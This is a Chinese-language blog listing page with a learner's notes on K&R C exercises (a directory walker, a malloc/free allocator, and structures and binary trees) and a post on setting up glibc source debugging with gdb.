(strlen(dir)+strlen(dp-&gt;name)+2 &gt; sizeof(name))            fprintf(stderr,&quot;dirwalk: name %s/%s too long\n&quot;,dir,dp-&gt;name);        else&#123;            sprintf(name,&quot;%s/%s&quot;,dir,dp-&gt;name);            (*fcn)(name);        &#125;    &#125;    closedir1(dfd);&#125;DIR1 *opendir1(char *dirname)&#123;	int fd;	struct stat stbuf;	DIR1 *dp;	if ((fd = open(dirname,0,O_RDONLY,0)) == -1	|| fstat(fd,&amp;stbuf) == -1	|| (dp = (DIR1 *) malloc(sizeof(DIR1))) == NULL)	return NULL;	dp-&gt;fd = fd;	return dp;&#125;#include &lt;sys/dir.h&gt;#ifndef DIRSIZ#define DIRSIZ 14#endifstruct direct1&#123;	ino_t d_ino;	char d_name[DIRSIZ];&#125;;Dirent *readdir1(DIR1 *dp)&#123;	struct direct1 dirbuf;	static Dirent d;	while(read(dp-&gt;fd,(char *)&amp;dirbuf,sizeof(dirbuf)) == sizeof(dirbuf))&#123;	if(dirbuf.d_ino == 0)		continue;	d.ino = dirbuf.d_ino;	strncpy(d.name, dirbuf.d_name,DIRSIZ);	d.name[DIRSIZ] = &#x27;\0&#x27;;	return &amp;d;&#125;	return NULL;&#125;void closedir1(DIR1 *dp)&#123;	if(dp)&#123;	close(dp-&gt;fd);	free(dp);&#125;&#125;







12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#define NAME_MAX 14#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/dir.h&gt;#define MAX_PATH 1024void dirwalk(char *dir,void (*fcn)(char *))&#123;    char name[MAX_PATH];    struct dirent *dp;    DIR *dfd;	if ((dfd = opendir(dir)) == NULL)    &#123;		fprintf(stderr,&quot;dirwalk: can&#x27;t open %s\n&quot;,dir);        return;    &#125;    //printf(&quot;here\n&quot;);    while ((dp = readdir(dfd)) != NULL)&#123;        //printf(&quot;dp-&gt;name:%s&quot;,dp-&gt;d_name);		if (strcmp(dp-&gt;d_name,&quot;.&quot;) ==0 || strcmp(dp-&gt;d_name,&quot;..&quot;)==0)            continue; //跳过自身和父目录        if (strlen(dir)+strlen(dp-&gt;d_name)+2 &gt; sizeof(name))            fprintf(stderr,&quot;dirwalk: name %s/%s too long\n&quot;,dir,dp-&gt;d_name);        else&#123;            sprintf(name,&quot;%s/%s&quot;,dir,dp-&gt;d_name);            (*fcn)(name);        &#125;    &#125;    closedir(dfd);&#125;void fsize(char *name)&#123;    struct stat stbuf;    if (stat(name,&amp;stbuf) == -1)    &#123;		fprintf(stderr,&quot;fsize: can&#x27;t access %s\n&quot;,name);    &#125;    if ((stbuf.st_mode &amp; S_IFMT) == S_IFDIR)	&#123;		//printf(&quot;is a dir\n&quot;);		dirwalk(name, fsize);	&#125;    printf(&quot;%8ld %s\n&quot;,stbuf.st_size,name);&#125;int main(int argc, char **argv)&#123;    if (argc == 1)        fsize(&quot;.&quot;);    else        while(--argc &gt; 0)            fsize(*++argv);    return 0;&#125;



​	其实那些opendir函数等都不需要自己实现(不过从练习的角度讲,可以自己实现) , 自己实现的话,记得要根据操作系统的情况, 把对应的结构体都修改了,否则就会出问题
https://github.com/Heatwave/The-C-Programming-Language-2nd-Edition/tree/master/chapter-8-the-unix-system-interface
https://www.learntosolveit.com/cprogramming/chapter8/ex_8.5_fsize
niubi: https://stackoverflow.com/questions/7381000/what-is-wrong-with-this-example-from-kr
8.7 存储分配程序实例​	内存抽象成块的组织形式,以链表的形式进行组织,每个块都含有一个长度、指向下一个块的指针以及一个指向自身数据存储位置的指针.
1234567891011typedef long Align; //按照long类型的边界对齐union header&#123; //内存块的头部信息    struct &#123;        union header *ptr; // 空闲块链表中的下一块        unsigned size; // 当前块的大小    &#125; s;    Align x; //强制块的对齐 (效果就是8字节对齐,计算机中对齐通常取决于包含的最大基本数据类型的大小&#125;;typedef union header Header;



malloc时,   ,找到的块太大的话,把尾部返回给用户,这样,初始块的头部只需要修改size就可以了




free时,寻找的首先是这样的情况,   bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr


如果不符合,看是否符合这种情况,即被释放的块在链表的开头或者末尾




最终代码
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &lt;stddef.h&gt;#include &lt;string.h&gt;typedef long Align; //按照long类型的边界对齐union header&#123; //内存块的头部信息    struct &#123;        union header *ptr; // 空闲块链表中的下一块        unsigned size; // 当前块的大小    &#125; s;    Align x; //强制块的对齐 (效果就是8字节对齐,计算机中对齐通常取决于包含的最大基本数据类型的大小&#125;;typedef union header Header;static Header base; //从空链表开始?static Header *freep  = NULL; //空闲链表的初始指针void *malloc(unsigned nbytes)&#123;    Header *p,*prevp;    Header *morecore(unsigned);    unsigned nunits;    nunits = (nbytes+sizeof(Header)-1)/sizeof(Header)+1;// +1是那个Align x?    if ((prevp=freep) == NULL)&#123; //没有空闲链表        base.s.ptr = freep = prevp = &amp;base;        base.s.size= 0;    &#125;    for(p = prevp-&gt;s.ptr; ;prevp=p,p = p-&gt;s.ptr)&#123;        if(p-&gt;s.size &gt; nunits)&#123;//足够大            if (p-&gt;s.size == nunits) //正好                    prevp-&gt;s.ptr = p-&gt;s.ptr; //从链表中卸下p            else&#123;  //大了,分配剩下的                p-&gt;s.size = p-&gt;s.size - nunits; //剩下的大小                p += p-&gt;s.size; //p移动到了分配的那里                p -&gt;s.size = nunits;//p的大小改成了分配的大小,(那之前的呢?)            // 逻辑是这样,找到的块太大的话,把尾部返回给用户,            //这样,初始块的头部只需要修改size就可以了            &#125;            freep = prevp;            return (void *)(p+1);//返回数据部分的指针        &#125;        if (p == freep) //闭环的空闲链表            if ((p = morecore(nunits)) == NULL)                return NULL; //没有剩余的存储空间了    &#125;&#125;void free(void *ap)&#123;    Header *bp, *p;    bp  = (Header *)ap - 1; //指向块头    for (p = freep; !(bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr); p = p-&gt;s.ptr)        if (p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))            break; //被释放的块在链表的开头或者末尾    if( bp + bp-&gt;s.size == p-&gt;s.ptr)&#123; //与前面相邻块合并        bp-&gt;s.size += p-&gt;s.ptr-&gt;s.size;        bp-&gt;s.ptr = p-&gt;s.ptr-&gt;s.ptr;    &#125; else        bp-&gt;s.ptr = p-&gt;s.ptr; //串进链表里        if(p + p-&gt;s.size == bp)&#123; //与后面的堆块合并        p-&gt;s.size += bp-&gt;s.size;        p-&gt;s.ptr = bp-&gt;s.ptr; //这一句是不是没必要呢?? 有必要的,如果上一次和前面的合并了        //这里也可能出现再次合并, 这里需要修改指针的    &#125; else        p-&gt;s.ptr = bp;    freep = p;&#125;#define NALLOC 1024Header *morecore(unsigned nu)&#123;    char *cp, *sbrk(int);    Header *up;    if (nu &lt; NALLOC) nu = NALLOC;    cp = sbrk(nu * sizeof(Header));    if (cp == (char *) -1)        return NULL;    up = (Header *) cp;    up-&gt;s.size = nu;    free((void * )(up+1));    return freep;&#125;void main()&#123;        char *str1;        char *str2;        str1 = malloc(0x20);        strcpy(str1, &quot;hello&quot;);        str2 = malloc(0x30);        strcpy(str2, &quot;tang&quot;);&#125;





</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" title="pwn入门-46-glibc源码调试">pwn入门-46-glibc源码调试</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-06T13:01:36.000Z" title="发表于 2023-11-06 21:01:36">2023-11-06</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-06T13:09:54.308Z" title="更新于 2023-11-06 21:09:54">2023-11-06</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​	有时候需要看库函数哪里出问题了,有源码调试的话,看起来会更直观和方便
glibc源代码调试​	开启gdb后 dir  xxxx目录 即可
​	但dir命令加载源码只能指定单个目录或文件,在gdb启动的时候用这个命令来加载glibc源码进去就好了
1gdb `find ~/path/to/glibc/source -type d -printf &#x27;-d %p &#x27;` ./a.out

当前机器版本libc​	安装带调试版本libc
12apt install libc6-dbg  apt install libc6-dbg:i386

​	下载对应的源代码
1231. 修改/etc/apt/sources.list 开启deb-src (不知道是不是都要开)2. apt update3. apt source libc6-dev

​	注意第三步会在当前目录进行下载
​	调试的时候进行指定即可: gdb -q .&#x2F;pwn -d &#x2F;xxx&#x2F;xxx&#x2F;glibc-2.31&#x2F; 
不同版本glibc下载与编译官方下载与编译https://ftp.gnu.org/gnu/glibc/
123456git clone git://sourceware.org/git/glibc.git &amp;&amp; cd glibcgit checkout glibc-2.31mkdir build &amp;&amp; cd build../configure --prefix=/usr/local/glibc-2.31-debug --enable-debug=yesmake -j16make install    # 这时候/usr/local/glibc-2.31-debug/就有文件了 包含库文件和头文件

查看当前分支: git branch
查看有哪些分支: git branch -a
指定编译好的库进行文件编译​	–rpath指定共享库路径  -I指定动态链接器
​	就可以用指定的libc来编译代码了, 这样的话, 也会很自然就有glibc的源代码可以调试了
1gcc -L/usr/local/glibc-2.31-debug/lib -Wl,--rpath=/usr/local/glibc-2.31-debug/lib -Wl,-I/usr/local/glibc-2.31-debug/lib/ld-2.31.so hello.c -o hello

​	为什么不用加 -g了? (需要的,如果要看hello.c的源代码的话)
​	但是用glibcallinone下载的不行..有问题, 那是因为它只有编译好的库,没有头文件之类的吧?
glibc-all-in-one工具​	这里是编译好的,一般都是带符号的,但是如果需要源代码调试还是需要下载源码并加载进gdb里面进行调试
​	https://blog.csdn.net/csdn546229768/article/details/122691241
​	如果网站里没有的话,就修改download源代码, 换个source看看,google精准搜索搜索一下
debug信息​	符号文件在哪呢, 被编译进程序里了吧,我记得之前有单独的符号文件的

ls -al &#x2F;usr&#x2F;lib&#x2F;debug&#x2F;.build-id&#x2F;这里有
12345678drwxr-xr-x   2 root root  4096 7月  27 10:48 .drwxr-xr-x 236 root root  4096 7月  27 10:48 ..-rw-r--r--   1 root root 23496 4月   7  2022 329f3d85e153a01672b77b853beda0faf0dee6.debug-rw-r--r--   1 root root 20104 4月   7  2022 9f5043bbf7cfbf4dfd27684d9c3cbcbb835bd9.debug-rw-r--r--   1 root root 19468 4月   7  2022 b0728b23be4032704a004d8066a268c4b6924a.debug-rw-r--r--   1 root root 20052 4月   7  2022 bbb582f3d2cd3464764682f1937b4e3d9c2641.debug-rw-r--r--   1 root root 22200 4月   7  2022 c4ae3a65bc87ea96986b3b2441e892c8a433f0.debug-rw-r--r--   1 root root 22168 4月   7  2022 cd9124f765fe93560701d55d5c61c37be4657a.debug



但是glibcallinone里没找到这个呀…
他们之间是什么关系呢?
libc编译案例​	做一道题需要23版本的libc,用ubuntu20编译的有问题..换18试试 (也有很多报错, 难道得换debian?)
​	source是源码,右边是编译好的,但是没有符号信息
​	难道版本不对? 这个source看起来是没有什么问题的,下载后看了下源码文件

https://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu11
http://launchpadlibrarian.net/409875491/libc6_2.23-0ubuntu11_amd64.deb
1234mkdir build &amp;&amp; cd build../configure --prefix=/usr/local/glibc-2.23-debug --enable-debug=yesmake -j16make install    # 这时候/usr/local/glibc-2.23-debug/就有文件了 包含库文件和头文件



罢了……..还是报错….处理不了……..(回头试试16, 或者说 还是得换debian?  不纠结这个编译问题了…)
转机https://launchpad.net/ubuntu/xenial/amd64/libc6-dbg/2.23-0ubuntu11

嘶,用了一下还是不太行
不过实际做题也未必要一模一样的环境,反正给了libc,可以从里面找偏移
报错处理之前报错说要加–disable-werror, 但是好像也没啥用,
..&#x2F;configure –disable-werror  –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;glibc-2.23  –enable-debug&#x3D;yes
12error: argument 1 of type ‘struct __jmp_buf_tag *’ declared as a pointer [-Werror=array-parameter=]  743 | extern int __sigsetjmp (struct __jmp_buf_tag *__env,

https://stackoverflow.com/questions/76079071/when-i-compile-glibc-2-28-with-the-make-command-on-centos-7-5-i-got-the-error-l
make[1]: *** [Makefile:214: stdio-common&#x2F;subdir_lib] Error
https://www.cnblogs.com/zq10/p/14314952.html
https://gist.github.com/stefan1wan/5e4b3973aae578ac39f94d30a5555f19
make[2]: *** No rule to make target ‘..&#x2F;manual&#x2F;errno.texi’, needed by ‘..&#x2F;sysdeps&#x2F;gnu&#x2F;errlist.c’.  Stop
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion &#96;sym !&#x3D; NULL’ failed!
问: 这里有现成的libc可以用,但是没有符号文件,    符号和源代码又是两回事吧
答: 是的,两回事
问: 没有符号咋办, 只能进行编译吗..
答:  我记得之前做海大ctf,ida可以导入符号文件,网上有编译好的符号文件,这个网站上也有symbol, 但是不全
问: gcc直接用这里的库编译会有问题,需要install?
问: 如何编译符号文件呢
调试案例printf的调用路径12345#include &lt;stdio.h&gt;void main()&#123;    printf(&quot;hello,%s\n&quot;,&quot;world&quot;); //防止优化为puts&#125;



​	调试, bt追踪栈
1234#0  0x00007ffff7e5ca69 in __printf (format=0x55555555600a &quot;hello,%s\n&quot;) at printf.c:28#1  0x0000555555555169 in main ()#2  0x00007ffff7e2d013 in __libc_start_main (main=0x555555555149 &lt;main&gt;, argc=1, argv=0x7fffffffe5a8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe598) at ../csu/libc-start.c:308#3  0x000055555555508e in _start ()

​	会发现进入的是__printf函数,为什么不是printf函数呢? 需要看libc源代码
​	进到这里是因为ldbl_strong_alias (__printf, printf); 将printf和  _ _ printf进入了的函数统一为 _ _printf
​	stdio-common&#x2F;printf.c
1234567891011121314151617181920212223242526#include &lt;libioP.h&gt;#include &lt;stdarg.h&gt;#include &lt;stdio.h&gt;#undef printf/* Write formatted output to stdout from the format string FORMAT.  *//* VARARGS1 */int__printf (const char *format, ...)&#123;  va_list arg;  int done;  va_start (arg, format);  done = vfprintf (stdout, format, arg);  va_end (arg);  return done;&#125;#undef _IO_printfldbl_strong_alias (__printf, printf);/* This is for libg++.  */ldbl_strong_alias (__printf, _IO_printf);



​	__printf又主要调用了vfprintf函数,在stdio-common&#x2F;vfprintf.c中, 这个函数有点长
函数完整加载过程恩….比较复杂..有时间专门学习下..

原文地址: http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html
翻译: https://zhuanlan.zhihu.com/p/52054044
https://zhuanlan.zhihu.com/p/521205296
其他参考: 
https://xuanxuanblingbling.github.io/ctf/pwn/2021/12/12/csu/
程序员的自我修养里面也有
_start1234567891011121314150000000000001060 &lt;_start&gt;:    1060:	f3 0f 1e fa          	endbr64    1064:	31 ed                	xor    %ebp,%ebp    1066:	49 89 d1             	mov    %rdx,%r9    1069:	5e                   	pop    %rsi    106a:	48 89 e2             	mov    %rsp,%rdx    106d:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp    1071:	50                   	push   %rax    1072:	54                   	push   %rsp    1073:	4c 8d 05 66 01 00 00 	lea    0x166(%rip),%r8        # 11e0 &lt;__libc_csu_fini&gt;    107a:	48 8d 0d ef 00 00 00 	lea    0xef(%rip),%rcx        # 1170 &lt;__libc_csu_init&gt;    1081:	48 8d 3d c1 00 00 00 	lea    0xc1(%rip),%rdi        # 1149 &lt;main&gt;    1088:	ff 15 52 2f 00 00    	callq  *0x2f52(%rip)        # 3fe0 &lt;__libc_start_main@GLIBC_2.2.5&gt;    108e:	f4                   	hlt    108f:	90                   	nop







__libc_start_mainstarti可以从最开始启动时下断点

可以慢慢地去一探究竟程序的过程了！
https://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html
​	它会处理执行环境的初始化工作, 然后调用main函数, 并且处理main函数的返回,
​	它可能干的事如下

performing any necessary security checks if the effective user ID is not the same as the real user ID.
initialize the threading subsystem.
registering the *rtld_fini* to release resources when this dynamic shared object exits (or is unloaded).
registering the *fini* handler to run at program exit.
calling the initializer function (**init*)().
calling main() with appropriate arguments.
calling exit() with the return value from main().

参考https://xuanxuanblingbling.github.io/ctf/tools/2020/03/20/gdb/
[原创]关于不同版本 glibc 更换的一些问题: https://bbs.kanxue.com/thread-254868.htm
https://gist.github.com/stefan1wan/5e4b3973aae578ac39f94d30a5555f19
问答有无符号的区别在哪呢….蒙圈了
函数、变量符号
有符号的话是可以看到定义的那些变量、函数等,但是不知道行数、具体的代码
符号文件在哪?
deb如何解包 dpkx -x   xxxxx.deb .&#x2F;
debug文件为什么会有单独的,为什么glibcallinone里的不用呢
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E7%BB%93%E6%9E%84-%E8%BE%93%E5%85%A5%E4%B8%8E%E8%BE%93%E5%87%BA/" title="c语言回炉重造-结构-输入与输出">c语言回炉重造-结构-输入与输出</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-31T10:00:20.000Z" title="发表于 2023-10-31 18:00:20">2023-10-31</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-31T10:02:45.077Z" title="更新于 2023-10-31 18:02:45">2023-10-31</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">编程基础</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C%E8%AF%AD%E8%A8%80/">C语言</a></span></div><div class="content">第六章 结构​	结构还是很重要的,在编写大型程序的时候,或者平常看源代码,会看到非常多的结构体
6.1 结构的基本知识​	在写这个程序的时候遇到了很奇怪的问题,dist &#x3D; sqrt(4.0);不会报错,但是dist &#x3D; sqrt(a);就会报错,百思不得其解.
12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;math.h&gt;void main()&#123;	struct point &#123;		int x;		int y;	&#125;;	struct point maxpt = &#123;320,200&#125;;	printf(&quot;length: %d, width: %d\n&quot;,maxpt.x,maxpt.y);	double dist;	printf(&quot;%f\n&quot;,(double)maxpt.x * maxpt.x + (double)maxpt.y * maxpt.y);	dist = sqrt(4.0);	double test = (double)maxpt.x * maxpt.x + (double)maxpt.y * maxpt.y;	double a = 4.0;	dist = sqrt(a);	//dist = sqrt(test);	//dist = sqrt( (double)maxpt.x * maxpt.x + (double)maxpt.y * maxpt.y );	//printf(&quot;%f\n&quot;,(double)maxpt.x * maxpt.x + (double)maxpt.y * maxpt.y);	//dist = sqrt(4.0);	printf(&quot;duijiaoxian: %f\n&quot;,dist);&#125;



​	神奇的gpt,所以是编译优化的事,   优化过后不用这个函数了,所以好像是显得没有问题一样,可以用gdb调试,会发现这里根本没有调用函数


123► 0x5555555551b5 &lt;main+108&gt;    movsd  xmm0, qword ptr [rip + 0xe7b]  0x5555555551bd &lt;main+116&gt;    movsd  qword ptr [rbp - 0x20], xmm0  0x5555555551c2 &lt;main+121&gt;    mov    eax, dword ptr [rbp - 8]

​	链接上就好了 gcc main.c -lm
12► 0x555555555244 &lt;main+219&gt;    call   sqrt@plt                &lt;sqrt@plt&gt;       x: 0x7ffff7e5f7e0 (_IO_stdfile_1_lock) ◂— 0x0







6.2 结构与函数​	
12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;math.h&gt;struct point &#123;		int x;		int y;	&#125;;// 矩形struct rect &#123;      struct point pt1;      struct point pt2;&#125;;struct point makepoint(int x,int y)&#123;        struct point temp;        temp.x = x;        temp.y = y;        return temp;&#125;;void main()&#123;        struct rect screen;    struct point middle;    struct point makepoint(int,int);        int XMAX, YMAX;    XMAX = YMAX = 0;    screen.pt1 = makepoint(100,100);    screen.pt2 = makepoint(XMAX,YMAX);    middle = makepoint((screen.pt1.x + screen.pt2.x)/2, (screen.pt1.y+screen.pt2.y)/2);    printf(&quot;middle&#x27;s x=  %d, middle&#x27;s y = %d\n&quot;,middle.x,middle.y);&#125;





6.3 结构数组​			需要注意各种定义的先后顺序
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;#include &lt;string.h&gt;#define MAXWORD 100struct key&#123;    char *word;    int count;&#125; keytab[] = &#123;    &quot;auto&quot;,0,    &quot;break&quot;,0,    &quot;case&quot;,0,    &quot;char&quot;,0,    &quot;const&quot;,0,    &quot;continue&quot;,0,    &quot;default&quot;,0,    &quot;unsigned&quot;,0,    &quot;void&quot;,0,    &quot;volatile&quot;,0,    &quot;while&quot;,0&#125;;//如何定义查找的结构体的长度呢?//#define NKEYS (sizeof keytab / sizeof(struct key))// 下面这种更好,即使类型改变了,也不需要改动程序#define NKEYS (sizeof keytab / sizeof keytab[0])int getword(char *,int);int binsearch(char *, struct key *,int);int main()&#123;    int n;    char word[MAXWORD];        while (getword(word,MAXWORD) != EOF)        if (isalpha(word[0]))            if((n = binsearch(word, keytab, NKEYS)) &gt;= 0)                keytab[n].count++;    printf(&quot;test\n&quot;);    printf(&quot;%d\n&quot;,NKEYS);   	for(n=0; n &lt; NKEYS;n++)        if(keytab[n].count &gt;0)            printf(&quot;%4d %s\n&quot;,keytab[n].count, keytab[n].word);    return 0;&#125;// 折半查找函数 、在tab[0]&lt;=tab[1]&lt;=tab[2]&lt;=....tab[n-1]中查找word// 如果在这里面判断是否到结尾的话,是不是有可能判断是否,比如有脏数据这种?int binsearch(char *word,struct key tab[],int n)&#123;    int cond;    int low,high,mid;    low = 0;    high = n-1;    while(low &lt;= high)    &#123;        mid = (low + high)/2;        if ((cond = strcmp(word,tab[mid].word)) &lt; 0)            high = mid - 1;        else if(cond &gt; 0)            low = mid + 1;        else            return mid;    &#125;    return -1; //没有匹配的值&#125;//从输入中读取下一个单词或字符int getword(char *word, int lim)&#123;    int c,getch(void);    void ungetch(int);    char *w = word;        while (isspace(c = getch())) ;         if (c!=EOF)        *w++ = c;    if(!isalpha(c))&#123; //说明是单个字符,        *w = &#x27;\0&#x27;;        return c;    &#125;    for(; --lim &gt;0; w++)        if(!isalnum(*w=getch()))&#123;            ungetch(*w);            break;        &#125;    *w = &#x27;\0&#x27;;    return word[0];//为啥要这样呢????, 为什么不是word呢, 看返回值类型,不是返回一个指针&#125;#define BUFSIZE 100char buf[BUFSIZE];int bufp = 0;int getch(void)&#123;    return (bufp &gt; 0)? buf[--bufp] : getchar();&#125;void ungetch(int c)&#123;    if (bufp &gt;= BUFSIZE)        printf(&quot;ungetch: too many characters\n&quot;);    else        buf[bufp++] = c;&#125;



&lt;ctype.h&gt;中
isspace 判断是否是空白符号, isalpha判断是否是字母,isalnum判断是否是数字或字母
标准的空白字符
123456&#x27; &#x27;     (0x20)	space (SPC) 空格符&#x27;\t&#x27;	(0x09)	horizontal tab (TAB) 水平制表符	&#x27;\n&#x27;	(0x0a)	newline (LF) 换行符&#x27;\v&#x27;	(0x0b)	vertical tab (VT) 垂直制表符&#x27;\f&#x27;	(0x0c)	feed (FF) 换页符&#x27;\r&#x27;	(0x0d)	carriage return (CR) 回车符



ctrl+d获取EOF结束输入
6.4 指向结构的指针123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;#include &lt;string.h&gt;#define MAXWORD 100struct key&#123;    char *word;    int count;&#125; keytab[] = &#123;    &quot;auto&quot;,0,    &quot;break&quot;,0,    &quot;case&quot;,0,    &quot;char&quot;,0,    &quot;const&quot;,0,    &quot;continue&quot;,0,    &quot;default&quot;,0,    &quot;unsigned&quot;,0,    &quot;void&quot;,0,    &quot;volatile&quot;,0,    &quot;while&quot;,0&#125;;//如何定义查找的结构体的长度呢?//#define NKEYS (sizeof keytab / sizeof(struct key))// 下面这种更好,即使类型改变了,也不需要改动程序#define NKEYS (sizeof keytab / sizeof keytab[0])int getword(char *,int);struct key *binsearch(char *, struct key *,int);int main()&#123;    char word[MAXWORD]; 	struct key *p;           while (getword(word,MAXWORD) != EOF)        if (isalpha(word[0]))            if((p = binsearch(word, keytab, NKEYS)) != NULL)                p-&gt;count++;   	for(p = keytab; p &lt; keytab + NKEYS;p++)        if(p-&gt;count &gt;0)            printf(&quot;%4d %s\n&quot;,p-&gt;count, p-&gt;word);    return 0;&#125;// 折半查找函数 、在tab[0]&lt;=tab[1]&lt;=tab[2]&lt;=....tab[n-1]中查找word//这种函数风格可以较好的看出类型来struct key *binsearch(char *word,struct key *tab,int n)&#123;    int cond;    struct key *low = &amp;tab[0];    struct key *high = &amp;tab[n];    struct key *mid;        while(low &lt; high)    &#123;        mid = low + (high-low)/2;        if ((cond = strcmp(word,mid-&gt;word)) &lt; 0)            high = mid;        else if(cond &gt; 0)            low = mid + 1;        else            return mid;    &#125;    return NULL; //没有匹配的值&#125;//从输入中读取下一个单词或字符int getword(char *word, int lim)&#123;    int c,getch(void);    void ungetch(int);    char *w = word;        while (isspace(c = getch())) ;         if (c!=EOF)        *w++ = c;    if(!isalpha(c))&#123; //说明是单个字符,        *w = &#x27;\0&#x27;;        return c;    &#125;    for(; --lim &gt;0; w++)        if(!isalnum(*w=getch()))&#123;            ungetch(*w);            break;        &#125;    *w = &#x27;\0&#x27;;    return word[0];//为啥要这样呢????, 为什么不是word呢,&#125;#define BUFSIZE 100char buf[BUFSIZE];int bufp = 0;int getch(void)&#123;    return (bufp &gt; 0)? buf[--bufp] : getchar();&#125;void ungetch(int c)&#123;    if (bufp &gt;= BUFSIZE)        printf(&quot;ungetch: too many characters\n&quot;);    else        buf[bufp++] = c;&#125;





6.5 自引用结构​		用二叉树来存储
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;#include &lt;string.h&gt;#define MAXWORD 100struct tnode *addtree(struct tnode *p, char *w);void treeprint(struct tnode *p);struct tnode *talloc(void);char *strdup1(char *s);int getword(char *word, int lim);struct tnode&#123;    char *word;    int count;    struct tnode *left;    struct tnode *right;&#125;;int main()&#123;    struct tnode *root;    char word[MAXWORD];        root = NULL;    while(getword(word,MAXWORD)!=EOF)        if(isalpha(word[0]))            root = addtree(root,word);    treeprint(root);    return 0;&#125;struct tnode *talloc(void);struct tnode *addtree(struct tnode *p, char *w)&#123;    int cond;        if (p == NULL)    &#123;        p = talloc();//创建一个新节点        p-&gt;word = strdup1(w);        p-&gt;count = 1;        p-&gt;left = p-&gt;right = NULL;	&#125;else if ((cond = strcmp(w,p-&gt;word)) == 0 )        p-&gt;count++;    else if(cond &lt; 0)        p-&gt;left = addtree(p-&gt;left,w);    else        p-&gt;right=addtree(p-&gt;right,w);    return p;&#125;//按顺序打印二叉树pvoid treeprint(struct tnode *p)&#123;    if (p!=NULL)    &#123;        treeprint(p-&gt;left);        printf(&quot;%4d %s\n&quot;,p-&gt;count,p-&gt;word);        treeprint(p-&gt;right);    &#125;&#125;#include &lt;stdlib.h&gt;//创建一个tnode//用sizeof计算大小更准确,考虑到对齐等struct tnode *talloc(void)&#123;    return (struct tnode *) malloc(sizeof(struct tnode));&#125;char *strdup1(char *s)&#123;    char *p;        p = (char *) malloc(strlen(s)+1);//+1是因为结尾要加\0    if (p != NULL)        strcpy(p,s);    return p;&#125;//从输入中读取下一个单词或字符int getword(char *word, int lim)&#123;    int c,getch(void);    void ungetch(int);    char *w = word;        while (isspace(c = getch())) ;         if (c!=EOF)        *w++ = c;    if(!isalpha(c))&#123; //说明是单个字符,        *w = &#x27;\0&#x27;;        return c;    &#125;    for(; --lim &gt;0; w++)        if(!isalnum(*w=getch()))&#123;            ungetch(*w);            break;        &#125;    *w = &#x27;\0&#x27;;    return word[0];//为啥要这样呢????, 为什么不是word呢,&#125;#define BUFSIZE 100char buf[BUFSIZE];int bufp = 0;int getch(void)&#123;    return (bufp &gt; 0)? buf[--bufp] : getchar();&#125;void ungetch(int c)&#123;    if (bufp &gt;= BUFSIZE)        printf(&quot;ungetch: too many characters\n&quot;);    else        buf[bufp++] = c;&#125;



6.6 表查找​		之前学过的,用散列等方法,进行查表


123456789struct nlist&#123; //链表项    struct nlist *next; //链表中下一个表项    char *name;			//定义的名字    char *defn;			//替换文本&#125;;#define HASHSIZE 101static struct nlist *hashtab[HASHSIZE]; //指针表

​		散列函数
